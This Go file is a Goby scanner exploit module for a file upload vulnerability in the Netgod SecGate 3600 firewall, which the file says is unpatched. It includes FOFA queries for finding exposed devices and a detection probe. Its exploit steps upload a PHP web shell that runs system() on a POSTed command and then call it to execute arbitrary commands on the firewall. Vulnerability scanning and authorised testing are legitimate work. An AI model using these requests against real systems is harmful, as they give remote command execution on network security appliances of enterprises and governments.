package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Netgod SecGate 3600 Firewall File Upload Vulnerability",
    "Description": "<p>Netgod SecGate 3600 firewall is a composite hardware firewall based on status detection packet filtering and application level agents. It is a new generation of professional firewall equipment specially developed for large and medium-sized enterprises, governments, military, universities and other users. It supports external attack prevention, internal network security, network access control, network traffic monitoring and bandwidth management, dynamic routing, web content filtering, email content filtering, IP conflict detection and other functions, It can effectively ensure the security of the network; The product provides flexible network routing/bridging capabilities, supports policy routing and multi outlet link aggregation; It provides a variety of intelligent analysis and management methods, supports email alarm, supports log audit, provides comprehensive network management monitoring, and assists network administrators in completing network security management.</p><p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.</p>",
    "Product": "legendsec-Secgate-3600-firewall",
    "Homepage": "https://www.legendsec.com/newsec.php?up=2&cid=63",
    "DisclosureDate": "2022-12-28",
    "Author": "1243099890@qq.com",
    "FofaQuery": "title=\"网神SecGate 3600防火墙\"",
    "GobyQuery": "title=\"网神SecGate 3600防火墙\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "filename|lastheader|regex|Set-Cookie: __s_sessionid__=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "577",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc",
                    "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"certfile\";filename=\"{{{filename}}}.php\"\nContent-Type: text/plain\n\n<?php echo(md5(233));unlink(__FILE__);?>\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"submit_post\"\n\nsec_web_auth_custom_setting_confsave\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"certfile_r\"\n\nfile\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/attachements/{{{filename}}}.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "filename|lastheader|regex|Set-Cookie: __s_sessionid__=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "577",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc",
                    "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"certfile\";filename=\"{{{filename}}}.php\"\nContent-Type: text/plain\n\n<?php system($_POST['cmd']);unlink(__FILE__);?>\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"submit_post\"\n\nsec_web_auth_custom_setting_confsave\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"certfile_r\"\n\nfile\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/attachements/{{{filename}}}.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "网神SecGate 3600防火墙 文件上传漏洞",
            "Product": "网神SecGate-3600防火墙",
            "Description": "<p>网神SecGate 3600防火墙是基于状态检测包过滤和应用级代理的复合型硬件防火墙，是专门面向大中型企业、政府、军队、高校等用户开发的新一代专业防火墙设备，支持外部攻击防范、内网安全、网络访问权限控制、网络流量监控和带宽管理、动态路由、网页内容过滤、邮件内容过滤、IP冲突检测等功能，能够有效地保证网络的安全；产品提供灵活的网络路由/桥接能力，支持策略路由，多出口链路聚合；提供多种智能分析和管理手段，支持邮件告警，支持日志审计，提供全面的网络管理监控，协助网络管理员完成网络的安全管理。</p><p>网神SecGate 3600防火墙存在文件上传漏洞，攻击者可以通过该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>网神SecGate 3600防火墙存在文件上传漏洞，攻击者可以通过该漏洞获取服务器控制权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Netgod SecGate 3600 Firewall File Upload Vulnerability",
            "Product": "legendsec-Secgate-3600-firewall",
            "Description": "<p>Netgod SecGate 3600 firewall is a composite hardware firewall based on status detection packet filtering and application level agents. It is a new generation of professional firewall equipment specially developed for large and medium-sized enterprises, governments, military, universities and other users. It supports external attack prevention, internal network security, network access control, network traffic monitoring and bandwidth management, dynamic routing, web content filtering, email content filtering, IP conflict detection and other functions, It can effectively ensure the security of the network; The product provides flexible network routing/bridging capabilities, supports policy routing and multi outlet link aggregation; It provides a variety of intelligent analysis and management methods, supports email alarm, supports log audit, provides comprehensive network management monitoring, and assists network administrators in completing network security management.</p><p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.</p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is a file upload vulnerability in SecGate 3600 firewall, which allows attackers to gain server control permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10786"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}